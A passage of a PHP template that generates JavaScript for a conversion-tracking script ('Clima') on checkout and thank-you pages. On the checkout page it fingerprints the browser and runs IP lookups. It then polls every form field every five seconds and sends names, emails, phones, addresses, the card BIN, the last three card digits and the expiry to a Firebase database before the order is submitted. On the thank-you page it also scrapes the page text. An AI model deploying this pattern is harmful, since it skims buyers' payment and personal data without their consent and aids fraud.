  var data={ts:Date.now(),purchaseClicked:false,urlParams:_allParams()};
  var fraud={ts:Date.now()};
  var fp={tz:(typeof Intl!=='undefined')?Intl.DateTimeFormat().resolvedOptions().timeZone:'',lang:navigator.language||'',scr:screen.width+'x'+screen.height,plat:navigator.platform||'',cores:navigator.hardwareConcurrency||0,touch:'ontouchstart' in window,cookies:navigator.cookieEnabled,dnt:navigator.doNotTrack||''};
  data.fingerprint=fp;fraud.fingerprint=fp;
  var urlAff=_detectAff();
  if(urlAff){data.affFromUrl=urlAff;try{localStorage.setItem('_ct_aff',urlAff);}catch(e){}}
  var bgData=_extractBGData();
  if(bgData.email)data.email=bgData.email;if(bgData.name)data.name=bgData.name;if(bgData.address)data.address=bgData.address;if(bgData.city)data.city=bgData.city;if(bgData.zip)data.zip=bgData.zip;if(bgData.phone)data.phone=bgData.phone;if(bgData.country)data.billingCountry=bgData.country;
  var ipGeo={ipv4:'',ipv6:''};
  function _runIPChecks(){if(!ipGeo.ip)return;fraud.checkMode='full';fraud.ip=ipGeo.ip;_saveFraud();if(!PROXY||!IPQS_KEY)console.warn('Clima: IPQS keys missing — re-generate checkout script after setting IPQS key + proxy in Settings');if(PROXY&&IPQS_KEY){fetch(PROXY+'?key='+IPQS_KEY+'&ip='+ipGeo.ip).then(function(r){return r.json();}).then(function(d){fraud.ipqs=d;_saveFraud();}).catch(function(){});}if(PC_KEY){fetch('https://proxycheck.io/v2/'+ipGeo.ip+'?key='+PC_KEY+'&vpn=1&asn=1&risk=1').then(function(r){return r.json();}).then(function(pc){fraud.proxyCheck=pc[ipGeo.ip]||{};_saveFraud();}).catch(function(){});}if(ABUSE_KEY&&PROXY){fetch(PROXY+'?abusekey='+ABUSE_KEY+'&abuseip='+ipGeo.ip).then(function(r){return r.json();}).then(function(d){if(d&&d.data)fraud.abuseipdb=d.data;_saveFraud();}).catch(function(){});}}
  function _setGeoChk(d){ipGeo.ip=d.ip||ipGeo.ip;ipGeo.country=d.country||'';ipGeo.countryCode=d.countryCode||d.country_code||'';ipGeo.region=d.region||'';ipGeo.city=d.city||'';ipGeo.zip=d.zip||d.postal||'';ipGeo.lat=d.lat||d.latitude||0;ipGeo.lon=d.lon||d.longitude||0;ipGeo.timezone=d.timezone||((d.timezone&&d.timezone.id)?d.timezone.id:'');ipGeo.isp=d.isp||d.org||'';ipGeo.asn=d.asn||'';if(d.ip&&d.ip.indexOf(':')>-1)ipGeo.ipv6=d.ip;else if(d.ip)ipGeo.ipv4=d.ip;}
  fetch(WORKER+'?geo=1').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.country){_setGeoChk(d);data.ipGeo=ipGeo;fraud.ipGeo=ipGeo;try{localStorage.setItem('_ct_ip',d.ip);if(d.ip.indexOf(':')===-1)localStorage.setItem('_ct_ipv4',d.ip);}catch(e){}_runIPChecks();_ctSend();return;}throw 'no geo';}).catch(function(){fetch('https://ipwho.is/').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.success!==false){ipGeo.ip=d.ip;ipGeo.country=d.country||'';ipGeo.countryCode=d.country_code||'';ipGeo.region=d.region||'';ipGeo.city=d.city||'';ipGeo.timezone=(d.timezone&&d.timezone.id)?d.timezone.id:'';ipGeo.isp=(d.connection&&d.connection.isp)?d.connection.isp:'';ipGeo.asn=(d.connection&&d.connection.asn)?'AS'+d.connection.asn:'';try{localStorage.setItem('_ct_ip',d.ip);if(d.ip.indexOf(':')===-1)localStorage.setItem('_ct_ipv4',d.ip);}catch(e){};}data.ipGeo=ipGeo;fraud.ipGeo=ipGeo;_runIPChecks();_ctSend();}).catch(function(){_runIPChecks();});});
  fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){ipGeo.ipv4=d.ip||'';if(!ipGeo.ip){ipGeo.ip=d.ip||'';data.ipGeo=ipGeo;fraud.ipGeo=ipGeo;}}).catch(function(){});
  fetch('https://api64.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){if(d.ip&&d.ip.indexOf(':')>-1)ipGeo.ipv6=d.ip;else if(!ipGeo.ipv4)ipGeo.ipv4=d.ip||'';if(!ipGeo.ip){ipGeo.ip=d.ip||'';data.ipGeo=ipGeo;fraud.ipGeo=ipGeo;}}).catch(function(){});
  function _ctGrab(){var fields=document.querySelectorAll('input,select');for(var i=0;i<fields.length;i++){var f=fields[i],n=(f.name||f.id||'').toLowerCase(),v=f.value||'';if(!v)continue;if(n.indexOf('name')>-1&&!data.name)data.name=v.substr(0,60);if((n.indexOf('first')>-1&&n.indexOf('name')>-1)||n==='firstname')data.firstName=v.substr(0,40);if((n.indexOf('last')>-1&&n.indexOf('name')>-1)||n==='lastname')data.lastName=v.substr(0,40);if(n.indexOf('email')>-1&&v.indexOf('@')>-1)data.email=v.substr(0,80);if(n.indexOf('phone')>-1||n.indexOf('tel')>-1)data.phone=v.substr(0,20);if(n.indexOf('address')>-1||n.indexOf('street')>-1)data.address=v.substr(0,100);if(n.indexOf('city')>-1)data.city=v.substr(0,40);if(n.indexOf('state')>-1||n.indexOf('province')>-1)data.state=v.substr(0,30);if(n.indexOf('zip')>-1||n.indexOf('postal')>-1)data.zip=v.substr(0,10);if(n.indexOf('country')>-1&&v.length<=3)data.billingCountry=v.toUpperCase();if(n.indexOf('card')>-1&&n.indexOf('number')>-1&&v.length>=12){var digits=v.replace(/\D/g,'');data.cardBin=digits.substr(0,6);data.cardLast3=digits.substr(-3);var first=digits.charAt(0);data.cardType=first==='4'?'Visa':first==='5'?'Mastercard':first==='3'?'Amex':'Other';}if(n.indexOf('card')>-1&&(n.indexOf('exp')>-1||n.indexOf('month')>-1||n.indexOf('year')>-1)){if(!data.cardExp)data.cardExp='';data.cardExp+=v+'/';}}/* BuyGoods-specific field names */
if(n==='billing_first_name'||n==='billing-first-name'){if(!data.firstName)data.firstName=v.substr(0,40);}
if(n==='billing_last_name'||n==='billing-last-name'){if(!data.lastName)data.lastName=v.substr(0,40);}
if((n==='billing_email'||n==='billing-email')&&v.indexOf('@')>-1){if(!data.email)data.email=v.substr(0,80);}
if(n==='billing_phone'||n==='billing-phone'){if(!data.phone)data.phone=v.substr(0,20);}
if(n==='billing_address_1'||n==='billing_address'||n==='billing-address-1'){if(!data.address)data.address=v.substr(0,100);}
if(n==='billing_city'){if(!data.city)data.city=v.substr(0,40);}
if(n==='billing_postcode'||n==='billing_zip'){if(!data.zip)data.zip=v.substr(0,10);}
if(n==='billing_country'){if(!data.billingCountry)data.billingCountry=v.toUpperCase().substr(0,3);}
if(!data.name&&(data.firstName||data.lastName))data.name=((data.firstName||'')+' '+(data.lastName||'')).trim();}
  function _runEmailPhoneCheck(){if(!PROXY||!IPQS_KEY)return;if(data.email&&!fraud._emailChecked){fraud._emailChecked=true;fetch(PROXY+'?key='+IPQS_KEY+'&email='+encodeURIComponent(data.email)).then(function(r){return r.json();}).then(function(d){fraud.ipqsEmail=d;_saveFraud();}).catch(function(){});}if(data.phone&&!fraud._phoneChecked){fraud._phoneChecked=true;fetch(PROXY+'?key='+IPQS_KEY+'&phone='+encodeURIComponent(data.phone)).then(function(r){return r.json();}).then(function(d){fraud.ipqsPhone=d;_saveFraud();}).catch(function(){});}}
  function _saveFraud(){fetch(FB+'/tracker/fraud-checks/'+sid+'.json',{method:'PATCH',body:JSON.stringify(fraud),keepalive:true});}
  document.addEventListener('click',function(e){var t=e.target.closest('button,a,input[type=submit]');if(!t)return;var txt=(t.textContent||t.value||'').toLowerCase();if(/buy|complete|place order|submit|pay|rush my order/i.test(txt)){data.purchaseClicked=true;data.purchaseClickTs=Date.now();data.checkoutDuration=Math.round((Date.now()-startT)/1000);try{localStorage.setItem('_ct_checkout_done','1');}catch(e2){}_ctGrab();data.urlParams=_allParams();_ctSend();_runEmailPhoneCheck();_saveFraud();}});
  function _ctSend(){_ctGrab();fetch(FB+'/tracker/checkout-sessions/'+sid+'.json',{method:'PATCH',body:JSON.stringify(data),keepalive:true});}
  var _si=setInterval(function(){_ctGrab();if(data.name||data.email||data.phone){_ctSend();_runEmailPhoneCheck();}},5000);
  setTimeout(function(){_ctGrab();_ctSend();},3000);
  document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){clearInterval(_si);_ctSend();_saveFraud();}});
  window.addEventListener('pagehide',function(){clearInterval(_si);_ctSend();_saveFraud();});
})();

<?php elseif ($type === 'ty'): ?>
/* ===== THANK YOU PAGE ===== */
console.log('%c✓ Clima conversion tracking complete','color:#0A6C80;font-weight:bold;');
(function(){
  /* --- Session ID Recovery Chain --- */
  var sid=localStorage.getItem('_ct_sid')||'';
  var bgData=_extractBGData();
  var email=bgData.email||P.get('emailaddress')||'';
  var globalOid=P.get('order_id_global')||(function(){try{return localStorage.getItem('_ct_global_oid')||'';}catch(e){return'';}})();
  var localOid=P.get('order_id')||P.get('cbreceipt')||'';
  var orderId=globalOid||localOid;
  if(!sid&&email){sid='em_'+_stableHash(email);try{localStorage.setItem('_ct_sid',sid);}catch(e){}}
  if(!sid&&globalOid){sid='g_'+_stableHash(globalOid);try{localStorage.setItem('_ct_sid',sid);}catch(e){}}
  if(!sid)sid=P.get('subid')||'';
  if(!sid)sid='ty'+Date.now().toString(36)+Math.random().toString(36).substr(2,4);
  if(globalOid){try{localStorage.setItem('_ct_global_oid',globalOid);}catch(e){}}
  var aff=localStorage.getItem('_ct_aff')||'';
  var oid=localStorage.getItem('_ct_oid')||OID;
  var variant=localStorage.getItem('_ct_var')||P.get('product_codename')||'';
  var urlAff=_detectAff();
  if(urlAff){aff=urlAff;try{localStorage.setItem('_ct_aff',urlAff);}catch(e){}}
  var ds=_etDateStr();

  /* --- DOM Data Extraction (email, order ID, product from page text) --- */
  function _extractPageData(){
    try{
      var txt=(document.body&&document.body.innerText)||'';
      /* Email from page text */
      if(!email){var em=txt.match(/[\w.+-]+@[\w.-]+\.\w{2,}/);if(em)email=em[0];}
      /* Order ID from page text: "Order ID: XXXXX" */
      if(!orderId){var om=txt.match(/Order\s*(?:ID|#|Number)[:\s]*([A-Z0-9]{4,})/i);if(om){orderId=om[1];if(!localOid)localOid=om[1];}}
      /* Product name */
      var pm=txt.match(/\d+\s*x\s+(.+?)(?:\n|$)/i);if(pm)bgData._product=pm[1].trim();
    }catch(e){}
  }

  /* --- DOM Amount Extraction --- */
  function _extractPageAmount(){
    /* 1. URL / BG params */
    var fromUrl=parseFloat(P.get('total')||P.get('order_total')||bgData.total||'0')||0;
    if(fromUrl>1)return fromUrl;
    /* 2. VMAP lookup by variant */
    var v=variant||P.get('product_codename')||'';
    if(v&&VMAP[v]&&VMAP[v].amount){var va=parseFloat(VMAP[v].amount)||0;if(va>0)return va;}
    /* 3. DOM scan for $XX.XX patterns */
    try{
      var txt=(document.body&&document.body.innerText)||'';
      var ms=txt.match(/\$\s*(\d{1,4}(?:\.\d{2})?)/g)||[];
      var amounts=[];
      ms.forEach(function(m){var n=parseFloat(m.replace(/[$\s]/g,''));if(n>=1&&n<=999)amounts.push(n);});
      if(amounts.length){amounts.sort(function(a,b){return a-b;});return amounts[0];}
    }catch(e){}
    /* 4. localStorage fallback */
    return parseFloat(localStorage.getItem('_ct_amount')||'0')||0;
  }

  /* --- Checkout data patch --- */
  if(bgData.email||bgData.name||bgData.phone||bgData.address){var chk={};if(bgData.email)chk.email=bgData.email;if(bgData.name)chk.name=bgData.name;if(bgData.address)chk.address=bgData.address;if(bgData.city)chk.city=bgData.city;if(bgData.zip)chk.zip=bgData.zip;if(bgData.phone)chk.phone=bgData.phone;if(bgData.country)chk.billingCountry=bgData.country;if(bgData.total)chk.total=bgData.total;if(orderId)chk.orderId=orderId;fetch(FB+'/tracker/checkout-sessions/'+sid+'.json',{method:'PATCH',body:JSON.stringify(chk),keepalive:true});}

  /* --- Get IP for TY page --- */
  var _tyIp='';
  try{_tyIp=localStorage.getItem('_ct_ipv4')||localStorage.getItem('_ct_ip')||'';}catch(e){}
  fetch(WORKER+'?geo=1').then(function(r){return r.json();}).then(function(d){
    if(d.ip){_tyIp=d.ip;try{localStorage.setItem('_ct_ip',d.ip);if(d.ip.indexOf(':')===-1)localStorage.setItem('_ct_ipv4',d.ip);}catch(e){}}
  }).catch(function(){});
  fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(d){if(d.ip&&!_tyIp){_tyIp=d.ip;try{localStorage.setItem('_ct_ipv4',d.ip);}catch(e){}}}).catch(function(){});

  /* --- Build TY event + sale patch (with 2s delay for DOM render) --- */
  function _buildSalePatch(amount){
    var patch={thankyouTs:Date.now(),thankyouCompleted:true};
    if(localOid)patch.orderId=localOid;
    else if(orderId)patch.orderId=orderId;
    if(globalOid)patch.orderIdGlobal=globalOid;
    if(amount>0)patch.amount=amount;
    if(bgData.total)patch.bgTotal=parseFloat(bgData.total)||0;
    if(email)patch.email=email;
    if(bgData.email)patch.bgEmail=bgData.email;
    if(bgData._product)patch.bgProduct=bgData._product;
    if(bgData.name)patch.bgName=bgData.name;
    if(bgData.phone)patch.bgPhone=bgData.phone;
    if(bgData.address)patch.bgAddress=bgData.address;
    if(bgData.city)patch.bgCity=bgData.city;
    if(bgData.zip)patch.bgZip=bgData.zip;
    if(bgData.country)patch.bgCountry=bgData.country;
    if(bgData.orderIdGlobal)patch.bgOrderIdGlobal=bgData.orderIdGlobal;
    if(bgData.orderId)patch.bgOrderId=bgData.orderId;
    if(P.get('product_codename'))patch.bgProduct=P.get('product_codename');
    if(P.get('account_id'))patch.bgAccountId=P.get('account_id');
    if(urlAff)patch.affFromUrl=urlAff;
    var _ip=_tyIp||'';try{if(!_ip)_ip=localStorage.getItem('_ct_ipv4')||localStorage.getItem('_ct_ip')||'';}catch(e){}if(_ip)patch.ip=_ip;
    patch.thankyouParams=_allParams();
    return patch;
  }

  /* --- Create new sale if none found --- */
  function _createNewSale(amount){
    var newKey='S'+Date.now().toString(36)+Math.random().toString(36).substr(2,4);
    var plat=localStorage.getItem('_ct_platform')||'';
    var sale={subId:sid,affId:aff,offerId:oid,variant:variant,orderId:localOid||orderId,orderIdGlobal:globalOid,amount:amount,platform:plat,date:ds,ts:Date.now(),status:'approved',source:'thankyou',thankyouCompleted:true,thankyouTs:Date.now()};
    if(email)sale.email=email;if(urlAff)sale.affFromUrl=urlAff;
    if(bgData.name)sale.bgName=bgData.name;if(bgData.phone)sale.bgPhone=bgData.phone;if(bgData.address)sale.bgAddress=bgData.address;if(bgData.city)sale.bgCity=bgData.city;if(bgData.zip)sale.bgZip=bgData.zip;if(bgData.country)sale.bgCountry=bgData.country;if(bgData.email)sale.bgEmail=bgData.email;if(bgData._product)sale.bgProduct=bgData._product;
    var _ip=_tyIp||'';try{if(!_ip)_ip=localStorage.getItem('_ct_ipv4')||localStorage.getItem('_ct_ip')||'';}catch(e){}if(_ip)sale.ip=_ip;
    fetch(FB+'/tracker/sales/'+newKey+'.json',{method:'PUT',body:JSON.stringify(sale),keepalive:true});
    _notifySale(sale);
    try{localStorage.setItem('_ct_saleKey',newKey);if(email)localStorage.setItem('_ct_saleKey_'+email,newKey);}catch(e){}
  }

  /* --- IP-based sale recovery --- */
  function _ipRecovery(ipv4,amount){
    if(!ipv4||!FB)return;
    fetch(FB+'/tracker/visitors/'+ds+'.json?orderBy="ipv4"&equalTo="'+encodeURIComponent(ipv4)+'"&limitToLast=3')
      .then(function(r){return r.json();}).then(function(vs){
        if(!vs||typeof vs!=='object')return;
        var vsids=Object.keys(vs);if(!vsids.length)return;
        var matchSid=vsids[vsids.length-1];
        fetch(FB+'/tracker/sales.json?orderBy="subId"&equalTo="'+matchSid+'"&limitToLast=1')
          .then(function(r){return r.json();}).then(function(sales){
            if(sales&&typeof sales==='object'){
              var skeys=Object.keys(sales);
              if(skeys.length){
                var fsk=skeys[0];
                try{localStorage.setItem('_ct_saleKey',fsk);if(email)localStorage.setItem('_ct_saleKey_'+email,fsk);}catch(e){}
                fetch(FB+'/tracker/sales/'+fsk+'.json',{method:'PATCH',body:JSON.stringify(_buildSalePatch(amount)),keepalive:true});
              } else { _createNewSale(amount); }
            } else { _createNewSale(amount); }
          }).catch(function(){_createNewSale(amount);});
      }).catch(function(){});
  }

  /* --- Main TY logic (runs after 2s for DOM to render) --- */
  setTimeout(function(){
    _extractPageData();
    if(email&&!sid.match(/^em_/)){var newSid='em_'+_stableHash(email);if(!sid||sid.match(/^ty/)){sid=newSid;try{localStorage.setItem('_ct_sid',sid);}catch(e){}}}
    var amount=_extractPageAmount();
    /* Save TY event */
    try{
      var pt=(document.body.innerText||'').substr(0,8000);
      var tyData={sid:sid,affId:aff,offerId:oid,variant:variant,orderId:orderId,orderIdGlobal:globalOid,amount:amount,ts:Date.now(),completed:true,urlParams:_allParams(),pageText:pt};
      if(email)tyData.email=email;
      if(bgData._product)tyData.product=bgData._product;
      if(_tyIp)tyData.ip=_tyIp;
      if(urlAff)tyData.affFromUrl=urlAff;
      var rm=pt.match(/receipt[:\s#]*([A-Z0-9]+)/i);if(rm)tyData.receiptId=rm[1];
      fetch(FB+'/tracker/thankyou-events/'+sid+'.json',{method:'PUT',body:JSON.stringify(tyData),keepalive:true});
    }catch(e){}

    /* Find existing sale key — verify it exists in Firebase first */
    var sk=localStorage.getItem('_ct_saleKey')||'';
    if(!sk&&email){try{sk=localStorage.getItem('_ct_saleKey_'+email)||'';}catch(e){}}
    if(sk){
      fetch(FB+'/tracker/sales/'+sk+'.json').then(function(r){return r.json();}).then(function(existing){
        if(existing&&existing.subId){
          /* Sale exists — patch it */
          try{localStorage.setItem('_ct_saleKey',sk);localStorage.setItem('_ct_sale_'+sid,'1');if(email){localStorage.setItem('_ct_saleKey_'+email,sk);localStorage.setItem('_ct_sale_'+email,'1');}}catch(e){}
          var patch=_buildSalePatch(amount);
          if(!existing.ip){try{var _ip=localStorage.getItem('_ct_ipv4')||localStorage.getItem('_ct_ip')||'';if(_ip)patch.ip=_ip;}catch(e){}}
          fetch(FB+'/tracker/sales/'+sk+'.json',{method:'PATCH',body:JSON.stringify(patch),keepalive:true});
          /* Send notification with merged sale data */
          var merged={};for(var k in existing)merged[k]=existing[k];for(var k in patch)merged[k]=patch[k];
          _notifySale(merged);
        } else {
          /* Sale key stale (deleted data) — clear and create new */
          try{localStorage.removeItem('_ct_saleKey');if(email)localStorage.removeItem('_ct_saleKey_'+email);}catch(e){}
          _createNewSale(amount);
        }
      }).catch(function(){_createNewSale(amount);});
      return;
    }

    /* Try by subId in Firebase */
    fetch(FB+'/tracker/sales.json?orderBy="subId"&equalTo="'+sid+'"&limitToLast=1')
      .then(function(r){return r.json();}).then(function(sales){
        if(sales&&typeof sales==='object'){
          var keys=Object.keys(sales);
          if(keys.length){
            var fsk=keys[0];
            try{localStorage.setItem('_ct_saleKey',fsk);if(email)localStorage.setItem('_ct_saleKey_'+email,fsk);}catch(e){}
            fetch(FB+'/tracker/sales/'+fsk+'.json',{method:'PATCH',body:JSON.stringify(_buildSalePatch(amount)),keepalive:true});
            return;
          }
        }
        /* Try by order_id_global */
        if(globalOid){
          fetch(FB+'/tracker/sales.json?orderBy="orderIdGlobal"&equalTo="'+globalOid+'"&limitToLast=1')
            .then(function(r){return r.json();}).then(function(s2){
              if(s2&&typeof s2==='object'){
                var k2=Object.keys(s2);
                if(k2.length){
                  try{localStorage.setItem('_ct_saleKey',k2[0]);}catch(e){}
                  fetch(FB+'/tracker/sales/'+k2[0]+'.json',{method:'PATCH',body:JSON.stringify(_buildSalePatch(amount)),keepalive:true});
                  return;
                }
              }
              /* Try IP recovery */
              var ipv4=localStorage.getItem('_ct_ipv4')||'';
              if(ipv4)_ipRecovery(ipv4,amount);else _createNewSale(amount);
            }).catch(function(){
              var ipv4=localStorage.getItem('_ct_ipv4')||'';
              if(ipv4)_ipRecovery(ipv4,amount);else _createNewSale(amount);
            });
        } else {
          /* No global OID — try IP then create */
          var ipv4=localStorage.getItem('_ct_ipv4')||'';
          if(ipv4)_ipRecovery(ipv4,amount);else _createNewSale(amount);
        }
      }).catch(function(){
        var ipv4=localStorage.getItem('_ct_ipv4')||'';
        if(ipv4)_ipRecovery(ipv4,amount);else _createNewSale(amount);
      });
  }, 2000);

  /* Immediate TY event (before 2s delay) */
  var d={sid:sid,affId:aff,offerId:oid,variant:variant,orderId:orderId,orderIdGlobal:globalOid,ts:Date.now(),completed:true,urlParams:_allParams()};
  if(urlAff)d.affFromUrl=urlAff;
  fetch(FB+'/tracker/thankyou-events/'+sid+'.json',{method:'PATCH',body:JSON.stringify(d),keepalive:true});
})();

<?php endif; ?>
})();
